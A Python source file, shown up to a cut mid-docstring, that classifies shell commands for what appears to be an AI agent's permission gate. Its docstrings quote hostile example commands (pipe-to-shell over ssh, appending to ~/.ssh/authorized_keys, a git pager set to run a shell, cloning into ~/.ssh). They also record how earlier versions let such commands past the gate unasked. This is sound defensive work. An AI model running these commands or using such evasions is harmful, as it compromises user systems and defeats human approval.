"""Structural classification of a ``bash_exec`` command string (PRD §3.2).

Implements steps 1-8 of ``.planning/2026-09-11-zed-acp-and-permission-spine-prd.md`` §3.2:
heredoc bodies are data (never commands), substitutions are lifted before anything is
dropped, splitting respects quoting, wrappers peel, payloads lift, and the surviving
signature carries the flags that change what a command *does* — so a grant on ``rm`` can
never cover ``rm -rf`` (critic finding 12).

Pure and stdlib-only: no filesystem, no environment, no expansion. Targets are reported as
written (``~/.ssh/id_rsa`` stays a tilde string); resolving them against the boundary is the
verdict's job (A2, PRD §3.1). ``shlex`` tokenizes one already-split command; the splitting,
quoting, heredoc and substitution work above it is ours because ``shlex`` has no notion of
shell grammar.

Two conventions the PRD leaves open, decided here and kept consistent:

* **Script arguments are not part of the signature.** ``python3 build.py`` and
  ``python3 tools/x.py`` share the key ``python3 <script>``; a module keeps its real name
  (``python3 -m pip``) because the module *is* the program. This is the gap PRD §3.2 names
  ("anything reached through a granted ``python3 FILE``") — it is stated, not hidden.
* **Runners compose rather than peel** (:data:`COMPOSING_RUNNERS`): ``uv run python -c "…"``
  is ``uv run python -c``, and the inner command's destructive / inline / write-target facts
  propagate to the composed segment. Peeling would erase the runner; ignoring the inner
  command would let ``uv run rm -rf x`` read as a plain ``uv run``.
"""

from __future__ import annotations

import fnmatch
import posixpath
import re
import shlex
from dataclasses import replace

from .gate_types import GateSettings, ShellClassification, ShellSegment

# --------------------------------------------------------------------------- constants

SUBSTITUTION_SENTINEL = "$__lh_subst__"
"""Placeholder left behind by PRD §3.2 step 2 when a substitution is lifted out.

It carries a ``$`` on purpose: whatever the substitution produced is unknown at
classification time, so any write target built from it is ``unresolvable_write`` (step 8).
"""

DIRECTORY_CHANGE_COMMANDS = frozenset({"cd", "pushd"})
"""Commands that move the shell, so every LATER segment of the same sequence writes somewhere
else (finding R2a). ``cd ~/.ssh && echo x >> authorized_keys`` used to drop the ``cd`` and report
the bare ``authorized_keys``, which the verdict then resolved against the workspace — the write
landed on the protected file with nothing asked. Both spellings move; ``pushd`` also stacks."""

DIRECTORY_RESTORE_COMMANDS = frozenset({"popd"})
"""``popd`` returns to whatever ``pushd`` stacked. The classifier does not model that stack, so a
pop makes the directory unknown and every later relative write unresolvable — the safe direction
(an unresolvable target is treated as outside the boundary, PRD §3.2 step 8)."""

HOME_DIRECTORY = "~"
"""Where a bare ``cd`` goes (bash(1)). Written as a tilde, like every other target: expanding it
is the verdict's job (PRD §3.1), not the classifier's — it never touches the environment."""

PREVIOUS_DIRECTORY = "-"
"""``cd -`` returns to ``$OLDPWD``, which is not knowable from the command text alone."""

ABSOLUTE_PATH_RE = re.compile(r"^(/|~|[A-Za-z]:[\\/])")
"""A target that already names its own root — POSIX, a tilde (the verdict expands it), or a
Windows drive (the owner dogfoods on Windows). Nothing is joined onto these."""

UNRESOLVABLE_TARGET_CHARS = ("$", "*", "?", "`", "{")
"""PRD §3.2 step 8: a target containing any of these cannot be resolved to a path here, so
it is treated as outside the boundary.

``{`` covers the two shapes that stand in for a path nobody has chosen yet: brace expansion
(``cp a b{1,2}``) and the ``{}`` placeholder a ``find -exec`` / ``xargs -I`` payload substitutes.
The placeholder became visible when clustered flags started signing as writes (finding R7) —
``find . -exec sed -Ei s/a/b/ {} +`` would otherwise have reported a write to a workspace file
literally named ``{}``."""

REDIRECTION_OPERATOR_CHARS = "<>&|"
"""Characters that may follow the first ``<``/``>`` of a redirection operator: ``>>``, ``>|``,
``>&``, ``<&``, ``<<<``, ``&>>``. Consumed as one unit by the splitter so an fd duplication is
never mistaken for the ``&`` separator, and by the redirection parser so ``N>&M`` is read as a
duplication rather than a write."""

REDIRECT_ONLY_SIGNATURE = ">"
"""Signature for a segment that is nothing but a redirection (``> file``). It is a write with
no command; step 8 still has to report its target."""

HERE_STRING_OPERATOR = "<<<"
"""``<<<WORD`` feeds one WORD to stdin. It is an OPERAND, not a heredoc: there is no body and no
delimiter line. Scanning it as a heredoc is the R1 bug — the scanner skipped ``<<<`` at its first
``<`` and then read the SECOND ``<`` as the start of a ``<<`` operator, took the rest of the line
as a delimiter word, and swallowed every following line as a body (bash(1) "Here Strings")."""

ARITHMETIC_OPENERS = ("$((", "((")
"""``$((expr))`` and ``((expr))`` are arithmetic, where ``<<`` is the left-shift OPERATOR. Their
contents are never scanned for heredoc operators, so ``echo $((1<<2)); rm -rf x`` keeps the ``rm``
visible instead of feeding it to a phantom heredoc body (bash(1) "Arithmetic Expansion")."""

ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
"""``K=V`` prefix form. PRD §3.2 step 4: ``env`` skips these before the wrapped command."""

DURATION_RE = re.compile(r"^\d+(\.\d+)?[smhd]?$")
"""``timeout``'s positional duration (``timeout 30``, ``timeout 1.5m``) — skipped when peeling."""

SHELL_KEYWORDS = frozenset({
    "if", "then", "elif", "else", "fi", "while", "until", "for", "do", "done",
    "case", "esac", "select", "function", "!", "{", "}",
})
"""Compound-command keywords. They are grammar, not commands, so they are stripped from the
front of a segment and a keyword-only segment is dropped — otherwise ``do rm -rf $f`` (the
body of a ``for`` loop, which PRD §3.2 step 3's ``;`` split hands us) would classify as ``do``
and hide the ``rm``."""

FUNCTION_DEFINITION_RE = re.compile(
    r"""^(?:
          function\s+(?P<keyword_name>[^\s(){}]+)\s*(?:\(\s*\))?   # function f  /  function f ()
        | (?P<name>[^\s(){}]+)\s*\(\s*\)                            # f()
        )\s*(?P<body>[{(].*)$""",
    re.DOTALL | re.VERBOSE,
)
"""A shell function DEFINITION, in its three spellings (critic finding F3c).

The body is real commands that run when the name is called, so it is recursed into and the
definition itself produces no segment: `function f { rm -rf x; }; f` yields the `rm -rf` plus an
unfamiliar `f`, where before the whole definition classified as a single command named `f` and the
`rm` was invisible. Requiring either the `function` keyword or the `()` is what keeps
`cmd { arg }` — a command with a brace-shaped argument — out of this branch."""

PATH_SEPARATORS = ("/", "\\")
"""A command may be spelled as a path. ``/bin/rm -rf x`` is ``rm -rf`` for signature purposes:
the leading directories are dropped so an absolute spelling cannot dodge the rule sets."""

WRAPPER_VALUE_FLAGS = frozenset({"-n", "-k", "-c", "-u", "-p", "--signal", "--kill-after"})
"""Wrapper flags that consume the next argument (``nice -n 10 cmd``, ``timeout -k 5 2 cmd``),
so the peel does not mistake the value for the wrapped command (PRD §3.2 step 4)."""

WRAPPER_NUMERIC_ARG = frozenset({"timeout"})
"""Wrappers whose first positional argument is a duration, not the wrapped command."""

WRAPPER_HEAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "watch": frozenset({"-n", "--interval"}),
    "flock": frozenset({"-w", "--wait", "--timeout", "-E", "--conflict-exit-code",
                        "-c", "--command"}),
    "chroot": frozenset({"--userspec", "--groups"}),
    "caffeinate": frozenset({"-t"}),
    "systemd-run": frozenset({"-u", "--unit", "-p", "--property", "-E", "--setenv", "--slice",
                              "--description", "--uid", "--gid", "--nice", "--working-directory",
                              "-M", "--machine", "--on-active", "--on-calendar"}),
    "uvx": frozenset({"--from", "--with", "--python", "-p", "--project", "--directory"}),
    "command": frozenset(),
    "exec": frozenset({"-a"}),
    "wsl": frozenset({"-d", "--distribution", "-u", "--user", "--cd", "--shell-type"}),
}
"""Value-taking options PER wrapper, REPLACING :data:`WRAPPER_VALUE_FLAGS` for these heads.

Replacing rather than extending is the point: the same letter means different things to
different wrappers. ``flock -n`` is ``--nonblock``, a boolean — reading it as a value flag (which
it is for ``nice``) would eat the lock file and peel to the wrong token. Sources: watch(1),
flock(1), chroot(1), caffeinate(8), systemd-run(1), `uvx` (uv docs). A ``--flag=value`` spelling
needs no entry.

``command`` and ``exec`` are the two shell builtins in the wrapper set, and the default table is
wrong for both (v0.14 critic A1). ``command``'s options — ``-p``, ``-v``, ``-V`` — are all
booleans, so the shared ``-p`` entry ate the wrapped command and ``command -p rm -rf x`` peeled
to the signature ``x``: a destructive delete filed as an unfamiliar command named after its own
argument. ``exec``'s ``-a NAME`` is the opposite mistake: it DOES take a value (the argv[0] the
wrapped command is given), so ``exec -a NAME rm -rf x`` peeled to ``NAME``. Sources: bash(1)
SHELL BUILTIN COMMANDS (``command [-pVv]``, ``exec [-cl] [-a name]``)."""

WRAPPER_POSITIONAL_SKIPS: dict[str, int] = {"flock": 1, "chroot": 1}
"""Wrappers whose first positional is an OPERAND, not the wrapped command: ``flock LOCKFILE CMD``
(a file or an fd number) and ``chroot DIR CMD``."""

WRAPPER_SUBCOMMANDS: dict[str, tuple[str, ...]] = {"poetry": ("run",), "pipx": ("run",)}
"""Wrappers that only wrap under one subcommand. ``poetry run rm -rf x`` runs the ``rm``;
``poetry install`` runs poetry's own installer, and peeling it would sign the segment as the
unrelated coreutils ``install``. No match means no peel."""

WRAPPER_INLINE_COMMAND_FLAGS: dict[str, tuple[str, ...]] = {"flock": ("-c", "--command")}
"""Wrappers that take their command as a STRING instead of as argv, so the string is shell text
to recurse into, exactly like ``sh -c`` (PRD §3.2 step 5). ``flock file -c "rm -rf x"`` has no
argv to peel to, and without this the command never appeared (flock(1))."""

SSH_VALUE_FLAGS = frozenset({
    "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l", "-m", "-O", "-o", "-P",
    "-p", "-Q", "-R", "-S", "-W", "-w",
})
"""ssh(1) options that consume the next argument; the first token after them is the HOST."""

DOCKER_EXEC_VALUE_FLAGS = frozenset({
    "-e", "--env", "--env-file", "-u", "--user", "-w", "--workdir", "--detach-keys",
})
"""docker-exec(1) options that consume the next argument; the first token after them is the
CONTAINER."""

REMOTE_EXEC_COMMANDS: dict[str, tuple[tuple[str, ...], frozenset[str], bool]] = {
    "ssh": ((), SSH_VALUE_FLAGS, True),
    "docker": (("exec",), DOCKER_EXEC_VALUE_FLAGS, False),
}
"""Commands that run their trailing arguments as a command SOMEWHERE ELSE — ``ssh [opts] HOST
CMD…`` and ``docker exec [opts] CONTAINER CMD…`` (finding R9).

The remote command is classified recursively as a payload, so ``ssh host 'curl http://x.sh | sh'``
surfaces the pipe-to-shell instead of one unfamiliar ``ssh``, and the host segment is marked
``inline_interpreter``: what runs under this key is not on this command line in any checkable
form, which is the same honesty ``eval`` and ``source FILE`` get.

Each entry is (subcommand prefix, value-taking options, the remote side runs a SHELL). Exactly
one positional — the host or the container — stands between the options and the command. The
last field is the difference between the two: ``ssh`` concatenates its remaining arguments with
spaces and hands the string to the remote user's shell, so the payload is shell TEXT; ``docker
exec`` execs the argv it is given with no shell at all, so the payload is argv and
``docker exec c sh -c 'rm -rf /srv'`` keeps its quoting (ssh(1), docker-exec(1)).

``docker compose exec`` is not lifted here — one prefix per command — but it is in the
destructive defaults under its own signature, so it is ungrantable and the human sees it."""

SUBCOMMAND_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "git": frozenset({"-c", "-C", "--git-dir", "--work-tree", "--namespace", "--exec-path"}),
}
"""Global flags that take a value *before* the subcommand. Without this,
``git -c core.sshCommand=x push --force`` would read its subcommand as the ``-c`` value
(PRD §3.2 step 7)."""

NESTED_SUBCOMMAND_GROUPS: dict[str, frozenset[str]] = {
    "docker": frozenset({"compose", "system", "volume", "network", "container", "image"}),
}
"""Subcommands that are a GROUP rather than a command, so the signature takes one more word.

``docker compose`` is not a thing anyone runs — ``docker compose up`` and ``docker compose ps``
are, and they are not the same command (one starts containers, the other lists them). Same for
the management groups whose members the destructive defaults name: ``docker system prune``,
``docker volume rm``, ``docker network rm``. Without this the group would be the whole key and a
grant on ``docker volume`` would cover ``rm`` (docker(1) "Management Commands").

``container`` and ``image`` are here for the key, not for a verdict: their destructive members
(``docker container rm``, ``docker image rm``) are the management spellings of ``docker rm`` and
``docker rmi`` and are NOT in the destructive defaults, so they are grantable — but at least the
grant is for that one operation rather than for the whole group."""

SUBCOMMAND_OPERATION_WORDS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "git branch": (
        ("-D", ("-D",)), ("-d", ("-d", "--delete")), ("-M", ("-M",)), ("-m", ("-m", "--move")),
        ("-C", ("-C",)), ("-c", ("-c", "--copy")),
    ),
    "git remote": (
        ("set-url", ("set-url",)), ("remove", ("remove",)), ("rm", ("rm",)),
        ("prune", ("prune",)), ("rename", ("rename",)), ("add", ("add",)),
        ("set-head", ("set-head",)), ("set-branches", ("set-branches",)),
        ("update", ("update",)), ("get-url", ("get-url",)), ("show", ("show",)),
    ),
    "git stash": (
        ("drop", ("drop",)), ("clear", ("clear",)), ("pop", ("pop",)), ("apply", ("apply",)),
        ("push", ("push",)), ("save", ("save",)), ("branch", ("branch",)),
        ("create", ("create",)), ("store", ("store",)), ("list", ("list",)), ("show", ("show",)),
    ),
    "git checkout": (("--", ("--", ".")),),
    "git restore": (("--worktree", ("--worktree", "-W")), ("--staged", ("--staged", "-S"))),
    "git worktree": (
        ("remove", ("remove",)), ("move", ("move",)), ("prune", ("prune",)), ("add", ("add",)),
        ("lock", ("lock",)), ("unlock", ("unlock",)), ("repair", ("repair",)), ("list", ("list",)),
    ),
    "git submodule": (
        ("deinit", ("deinit",)), ("add", ("add",)), ("update", ("update",)), ("init", ("init",)),
        ("sync", ("sync",)), ("foreach", ("foreach",)), ("set-url", ("set-url",)),
        ("set-branch", ("set-branch",)), ("absorbgitdirs", ("absorbgitdirs",)),
        ("summary", ("summary",)), ("status", ("status",)),
    ),
    "git reflog": (
        ("expire", ("expire",)), ("delete", ("delete",)), ("exists", ("exists",)),
        ("show", ("show",)),
    ),
    "git gc": (("--prune", ("--prune",)),),
    "git push": (("--delete", ("--delete", "-d")),),
}
"""The OPERATION a two-word signature is missing, when the operation is a third word or a flag.

``git branch`` lists branches and is in the ALLOW tier; ``git branch -D x`` deletes one and is
ungrantable. Both signed as the bare ``git branch``, so the read-only verdict covered the delete —
and the same collapse hid ``git remote set-url`` (repoint a remote at an attacker's host) behind
``git remote``, ``git stash drop`` behind ``git stash``, and ``git restore``'s worktree discard
behind a key that says nothing (v0.14 critic A2). This table restores the distinction the way
:data:`NESTED_SUBCOMMAND_GROUPS` does for docker's management groups, except that git spells some
of its operations as a FLAG (``branch -D``, ``restore --staged``, ``gc --prune``), which a
positional scan cannot see.

Each entry is (canonical suffix, the spellings that mean it), matched by :func:`_matches_flag`, so
``--flag=value`` and a short-option cluster (``git branch -vD``) both land. **First match in TABLE
order wins, not in command-line order** — the same rule as :data:`SED_MODE_FLAGS` — so the more
destructive reading is chosen when a command carries two: ``git restore --staged --worktree`` does
discard the worktree, and signs as ``git restore --worktree``.

Deliberate approximations, named rather than hidden: ``--delete --force`` on a branch spells the
same thing as ``-D`` but signs as ``-d`` (both are destructive, so nothing escapes); ``git
checkout``'s discard is recognized only in its two documented spellings (``--`` and a bare ``.``),
so ``git checkout ./src`` — a pathspec that is also a discard — still signs as the grantable
``git checkout``. Source: git-branch(1), git-remote(1), git-stash(1), git-checkout(1),
git-restore(1), git-worktree(1), git-submodule(1), git-reflog(1), git-gc(1), git-push(1)."""

FLAG_ALIASES: dict[str, tuple[str, ...]] = {
    "r": ("r", "R"),
    "R": ("R", "r"),
    "recursive": ("r", "R"),
    "f": ("f", "force"),
    "force": ("force", "f"),
    "force-with-lease": ("force", "f"),
    "force-if-includes": ("force", "f"),
    "hard": ("hard",),
}
"""Spellings of the destructive flags in ``GateSettings.destructive_flag_verbs``, resolved
against the verb's own canonical ids: ``rm --recursive --force`` → ``rm -rf``, ``git push -f`` →
``git push --force`` (PRD §3.2 step 7, docstring of ``DESTRUCTIVE_FLAG_VERBS_DEFAULT``).

``--force-with-lease`` maps to ``force`` deliberately: it still rewrites the remote, and the
alternative is worse — it would fall back to the bare ``git push`` key, so a grant on an
ordinary push would cover it.
"""

SCRIPT_PLACEHOLDER = "<script>"
"""PRD §3.2 step 7: the key a command that runs a FILE gets. The file's name is deliberately not
in the key (`python3 build.py` and `python3 tools/x.py` share one key) — see the module
docstring; the same placeholder is what ``source FILE`` gets."""

SOURCE_SIGNATURE = "source"
"""Canonical spelling for the ``source``/``.`` builtin, so both spellings of the same command
share one grant key (``source <script>``) instead of the second hiding behind a lone dot."""

NON_SHELL_INTERPRETERS = frozenset({"python", "python3", "node", "ruby", "perl", "uv run"})
"""The interpreters in ``GateSettings.interpreter_commands`` whose inline payload is NOT shell.

Everything else in that set has its ``-c`` string recursed into as shell text (PRD §3.2 step 5).
Naming the exceptions rather than the shells is what makes the knob real (finding R9b): the
hardcoded ``{"sh", "bash", "zsh"}`` it replaces meant adding ``fish`` to ``interpreter_commands``
changed the signature but left ``fish -c 'rm -rf x'`` unopened. A ``python3 -c`` payload is
python and is not re-parsed as shell.

``powershell``, ``pwsh`` and ``cmd`` are deliberately NOT listed as exceptions, which means their
inline payload IS re-parsed as shell (v0.14 critic A4). That is an APPROXIMATION, named here
rather than hidden: PowerShell and cmd are not POSIX shells, but they separate commands with the
same ``;`` and ``|`` (and PowerShell with ``&&``), and quote with the same ``'`` and ``"``, which
is enough for the one job this classifier has on that payload — finding the command names and
their flags. What it does NOT model is PowerShell's own grammar: a pipeline into a cmdlet that
takes a scriptblock, backtick escapes, ``@()``/``$()`` subexpressions, and cmd's ``^`` escape.
A payload that leans on those reads as unfamiliar segments, which ask."""


CASE_FOLDED_FLAG_INTERPRETERS = frozenset({"powershell", "pwsh", "cmd"})
"""Interpreters whose options are matched the way THEY match them, not the way POSIX does.

Two differences, both of which let a command line past the gate unread (v0.14 critic A4):

* Their options are case-insensitive and accept any unambiguous PREFIX, so ``-Command``,
  ``-command``, ``-Comm`` and ``-c`` are one flag — matched folded and by prefix, returning the
  canonical spelling from ``settings.inline_code_flags`` so all of them share ONE grant key.
* The inline flag does not have to come first. ``powershell -ExecutionPolicy Bypass -Command
  "…"`` puts a value-taking option in front of it, and ``cmd /c`` does not start with a dash at
  all — either one ended the ordinary scan at the first non-option token and filed the command
  as ``<script>`` with its payload unopened. For these heads every token is scanned for the
  inline flag before the positional rule applies.

Over-matching a prefix is the safe direction: it puts the command in the ``interpreter-inline``
class, which asks (powershell(1), cmd(1))."""

SPELLED_FLAG_LEADERS = ("-", "/")
"""A ``destructive_flag_verbs`` entry that already carries its own lead character is a Windows
flag spelled in full (``-Recurse``, ``/s``), not a POSIX letter to be clustered into ``-rf``.

The lead character IS the rule: PowerShell's one-dash-one-word options are matched folded and by
prefix, cmd's slash options folded and whole, and the suffix is emitted verbatim and
space-separated (``Remove-Item -Recurse -Force``) instead of through the POSIX cluster format.
Deriving the behavior from the spelling keeps one table for both worlds — see
``WINDOWS_DESTRUCTIVE_FLAG_VERBS`` in ``gate_types``."""


def _is_shell_interpreter(head: str, settings: GateSettings) -> bool:
    """Is this command's inline payload shell text? See :data:`NON_SHELL_INTERPRETERS`."""
    return head in settings.interpreter_commands and head not in NON_SHELL_INTERPRETERS

COMPOSING_RUNNERS = frozenset({"uv run"})
"""Commands that run another command in a changed environment. PRD §3.2 step 7 lists
``uv run`` as its own interpreter key, so the runner composes with the inner signature
instead of peeling away (see the module docstring)."""

UV_RUN_VALUE_FLAGS = frozenset({"--with", "--python", "-p", "--project", "--directory", "--package"})
"""``uv run`` flags that take a value, skipped when finding the inner command."""

FIND_PAYLOAD_PRIMARIES = ("-exec", "-execdir", "-ok", "-okdir")
"""PRD §3.2 step 5: ``find`` primaries whose argument list up to ``;`` or ``+`` is a command."""

FIND_PAYLOAD_TERMINATORS = (";", "+")
"""End of a ``find -exec`` payload (``\\;`` reaches us as ``;`` after tokenizing)."""

FIND_DELETE_SIGNATURE = "find -delete"
"""PRD §3.2 step 5 / ``DESTRUCTIVE_SIGNATURES_DEFAULT``: ``find -delete`` deletes without a
payload command, so the primary joins the signature (critic finding 4)."""

FIND_COMMAND = "find"
"""The one payload runner whose command sits behind a primary (``-exec``) instead of simply
following the options — every other member of ``settings.payload_commands`` goes through
:func:`_command_payload`."""

XARGS_VALUE_FLAGS = frozenset({"-n", "-I", "-i", "-P", "-d", "-a", "-E", "-s", "-L", "--max-args",
                               "--replace", "--max-procs", "--delimiter", "--arg-file", "--eof",
                               "--max-chars", "--max-lines"})
"""``xargs`` options that consume the next argument; the first token after them is the
payload command (PRD §3.2 step 5)."""

PARALLEL_VALUE_FLAGS = frozenset({"-j", "--jobs", "-n", "--max-args", "-N", "-I", "--replace",
                                  "-L", "--max-lines", "-S", "--sshlogin", "--delay", "--timeout",
                                  "--joblog", "--results", "--tmpdir", "--colsep", "-d",
                                  "--delimiter"})
"""GNU ``parallel`` options that consume the next argument (parallel(1)), same role as
:data:`XARGS_VALUE_FLAGS`."""

PAYLOAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "xargs": XARGS_VALUE_FLAGS,
    "parallel": PARALLEL_VALUE_FLAGS,
}
"""Per-runner option tables for :func:`_command_payload`. A runner with no entry is read as
"options are booleans", which is the safe reading: at worst the payload starts one token late and
the segment stays unfamiliar rather than silently read-only."""

PAYLOAD_ARGUMENT_SEPARATORS = (":::", "::::")
"""GNU ``parallel`` separates the command from its ARGUMENTS with these (``parallel rm -rf {} :::
a b``). Everything after one is data for the command, not more command (parallel(1))."""

GIT_CONFIG_SIGNATURE = "git config"
"""The plain ``git config`` key. A write that is not one of
``GateSettings.git_config_dangerous_keys`` keeps it (grantable); a dangerous one gets its key
appended and goes destructive; a read keeps it and is read-only."""

GIT_INLINE_CONFIG_FLAG = "-c"
GIT_INLINE_CONFIG_ENV_FLAG = "--config-env"
"""``git -c key=value CMD`` and ``git --config-env=key=VAR CMD`` set a config key for ONE command,
on any subcommand — ``git -c core.pager='sh -c evil' log`` turns a read into an exec. Both forms
are scanned on every ``git`` segment and a dangerous key is lifted into its own destructive
segment, so the host command keeps its own signature and the config write is still seen."""

GIT_CONFIG_READ_FLAGS = frozenset({
    "--get", "--get-all", "--get-regexp", "--get-urlmatch", "--get-color", "--get-colorbool",
    "-l", "--list",
})
GIT_CONFIG_WRITE_FLAGS = frozenset({
    "--add", "--unset", "--unset-all", "--replace-all", "--remove-section", "--rename-section",
    "--edit", "-e",
})
GIT_CONFIG_VALUE_FLAGS = frozenset({"--file", "-f", "--blob", "--type", "-t", "--default"})
"""git-config(1)'s three flag families: the ones that read, the ones that write, and the ones
whose next token is a value rather than the key. ``--global``/``--system``/``--local``/
``--worktree`` choose a FILE, not a direction, so they say nothing here — a scope flag with a key
and a value is still a write, which is why the direction is decided by flags and positionals
together."""

GIT_CONFIG_READ_SUBCOMMANDS = frozenset({"get", "list", "get-all", "get-regexp", "get-urlmatch"})
GIT_CONFIG_WRITE_SUBCOMMANDS = frozenset({
    "set", "unset", "add", "replace-all", "remove-section", "rename-section", "edit",
})
"""git 2.46's subcommand spelling (``git config set core.pager x``) alongside the classic flag
form. Without these, the modern spelling of exactly the same write would read as a bare key."""

SED_MODE_FLAGS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("-i", ("-i", "--in-place")),
    ("-n", ("-n", "--quiet", "--silent")),
)
"""``sed``'s mode is its flag: ``sed -n`` is the read-only signature listed in
``READ_ONLY_SIGNATURES_DEFAULT``, ``sed -i`` edits its file arguments in place. First match
wins, so ``sed -n -i`` is a write (PRD §3.2 steps 7-8)."""

CURRENT_DIRECTORY = "."
"""Where a destination-less ``git init`` puts the repository it creates (git-init(1))."""

GIT_CLONE_VALUE_FLAGS = frozenset({
    "-o", "--origin", "-b", "--branch", "-u", "--upload-pack", "--reference",
    "--reference-if-able", "--depth", "--separate-git-dir", "-c", "--config", "-j", "--jobs",
    "--template", "--shallow-since", "--shallow-exclude", "--filter", "--server-option",
    "--bundle-uri",
})
GIT_INIT_VALUE_FLAGS = frozenset({
    "--template", "--separate-git-dir", "-b", "--initial-branch", "--object-format", "--ref-format",
})
GIT_WORKTREE_ADD_VALUE_FLAGS = frozenset({"-b", "-B", "--reason"})
GIT_SUBMODULE_ADD_VALUE_FLAGS = frozenset({"-b", "--branch", "--name", "--reference", "--depth"})
"""Options of the four git subcommands that create something on disk, whose next token is a
VALUE and not the destination. Without them ``git clone -b main URL`` would report a write to
``main`` (git-clone(1), git-init(1), git-worktree(1), git-submodule(1))."""

GIT_DESTINATION_FIRST = "first"
GIT_DESTINATION_FIRST_OR_CWD = "first-or-cwd"
GIT_DESTINATION_LAST_OR_URL = "last-or-url"
"""How a git subcommand names the directory it creates: the first positional, the first with the
current directory as the default, or the last of two — falling back to the repository name inside
the URL when only the source is given."""

GIT_DESTINATION_SHAPES: dict[str, tuple[frozenset[str], str]] = {
    "git clone": (GIT_CLONE_VALUE_FLAGS, GIT_DESTINATION_LAST_OR_URL),
    "git init": (GIT_INIT_VALUE_FLAGS, GIT_DESTINATION_FIRST_OR_CWD),
    "git worktree add": (GIT_WORKTREE_ADD_VALUE_FLAGS, GIT_DESTINATION_FIRST),
    "git submodule add": (GIT_SUBMODULE_ADD_VALUE_FLAGS, GIT_DESTINATION_LAST_OR_URL),
}
"""PRD §3.2 step 8 for git: the four subcommands whose argument names a DIRECTORY THEY CREATE.

``git clone https://x ~/.ssh`` writes a whole repository into ``~/.ssh`` — including a
``.git/hooks`` directory whose contents git will later execute — and reported no write target at
all, so the protected-path tier never saw it (v0.14 critic A3). Same for ``git init ~/.ssh``,
``git worktree add DEST`` and ``git submodule add URL DEST``.

Per-subcommand because git spells the destination four different ways; the shapes are named above
rather than written as three branches, and the value-flag tables keep an option's argument from
being read as the destination."""

COPY_COMMANDS = ("cp", "mv", "install", "rsync")
"""PRD §3.2 step 8: the commands whose destination is a positional argument."""

TARGET_DIRECTORY_COMMANDS = frozenset({"cp", "mv", "install"})
"""The coreutils copies that also accept the destination as a FLAG: ``-t DIR`` /
``--target-directory=DIR`` puts every positional on the SOURCE side, so reading the last
positional reported the source as the target — ``cp -t ~/.ssh mykey`` looked like a write to
``mykey`` (finding R6). ``rsync`` is deliberately absent: its ``-t`` is ``--times``
(cp(1), mv(1), install(1), rsync(1))."""

TARGET_DIRECTORY_FLAGS = ("-t", "--target-directory")
NO_TARGET_DIRECTORY_FLAGS = ("-T", "--no-target-directory")
"""``-T`` says the destination is a plain file even when it is a directory, so the last
positional is the target — the same answer as the default path, kept explicit so the two flags
cannot be confused for each other."""

COPY_VALUE_FLAGS = frozenset({
    "-t", "--target-directory", "-S", "--suffix", "--backup",
    "-m", "--mode", "-o", "--owner", "-g", "--group", "-Z", "--context",
})
"""``cp``/``mv``/``install`` options whose next token is a VALUE, not a path. Without them
``install -m 755 -t DIR a`` would read the mode as a source and report ``DIR/755``."""

SED_SCRIPT_FLAGS = frozenset({"-e", "--expression", "-f", "--file"})
"""When present, every positional argument of ``sed`` is a file; otherwise the first
positional is the script and the rest are files."""

SED_ATTACHED_VALUE_LETTERS = "efl"
"""sed's short options whose argument may be written ATTACHED (``-e's/a/b/``, ``-f script``,
``-l 70``). Inside a cluster, everything after one of these letters is that argument, so
``sed -e's/i/x/'`` is not read as an in-place edit (sed(1))."""


# --------------------------------------------------------------------------- public API

def classify_shell(command: str, settings: GateSettings) -> ShellClassification:
    """Classify one shell command string. PRD §3.2 steps 1-8, in order.

    Pure: the same string and settings always produce the same classification.
    """
    text = _strip_heredocs(command)
    text = text.replace("\\\n", "")
    segments, dropped = _classify_text(text, settings)
    return ShellClassification(segments=tuple(segments), dropped=tuple(dropped))


# ------------------------------------------------------- working directory (finding R2a)

class _Cwd:
    """The directory the next segment runs in, carried along one top-level sequence.

    ``path`` is the directory as WRITTEN (``~/.ssh``, ``/tmp``, or a relative ``build``), or None
    for "wherever the command started" — the workspace, which is what the verdict resolves a bare
    relative target against. ``unresolvable`` means a ``cd`` whose target cannot be read off the
    command text (``cd $D``, ``cd "$(…)"``, ``popd``), which makes every later relative write
    unresolvable rather than silently workspace-local.

    Mutable on purpose: ``;``/``&&``/``||``/newline continue one shell, so a ``cd`` in front
    changes what follows it. A ``( … )`` subshell and a function body get a :meth:`copy`, because
    their ``cd`` does not outlive them; a ``{ … }`` group shares this object, because its does.
    """

    __slots__ = ("path", "unresolvable")

    def __init__(self, path: str | None = None, unresolvable: bool = False) -> None:
        self.path = path
        self.unresolvable = unresolvable

    def copy(self) -> _Cwd:
        return _Cwd(self.path, self.unresolvable)


def _apply_cd(cwd: _Cwd, argv: list[str]) -> None:
    """Move ``cwd`` the way this ``cd``/``pushd`` moves the shell (PRD §3.2 step 6, finding R2a)."""
    arguments = [
        token for token in argv[1:]
        if token == PREVIOUS_DIRECTORY or not token.startswith("-")
    ]
    target = arguments[0] if arguments else None
    if target is None:
        cwd.path, cwd.unresolvable = HOME_DIRECTORY, False
        return
    if target == PREVIOUS_DIRECTORY or any(bad in target for bad in UNRESOLVABLE_TARGET_CHARS):
        cwd.unresolvable = True
        return
    if ABSOLUTE_PATH_RE.match(target):
        cwd.path, cwd.unresolvable = _normalize(target), False
    elif not cwd.unresolvable:
        cwd.path = _normalize(posixpath.join(cwd.path, target) if cwd.path else target)


def _resolve_target(cwd: _Cwd, target: str) -> tuple[str, bool]:
    """Join a write target onto the directory it is written in — (target, unresolvable).

    PRD §3.2 step 8 reports targets as written; this only supplies the directory the shell is
    standing in, so the verdict resolves ``~/.ssh/authorized_keys`` rather than a bare
    ``authorized_keys`` it would place in the workspace (finding R2a).
    """
    if not target or ABSOLUTE_PATH_RE.match(target):
        return target, False
    if cwd.unresolvable:
        return target, True
    if cwd.path is None:
        return target, False
    return _normalize(posixpath.join(cwd.path, target)), False


def _normalize(path: str) -> str:
    """Collapse ``.`` and ``..`` in a joined path, keeping the spelling (tilde included)."""
    return posixpath.normpath(path) if path else path


# --------------------------------------------------------------------------- step 1

def _strip_heredocs(command: str) -> str:
    """PRD §3.2 step 1: remove heredoc bodies (and their operators) before any scan.

    The body is data the command is *writing*; the naive regex that skipped this step
    flagged 9 of 68 calls in the corpus (PRD §3.2). A body line ends the heredoc only when
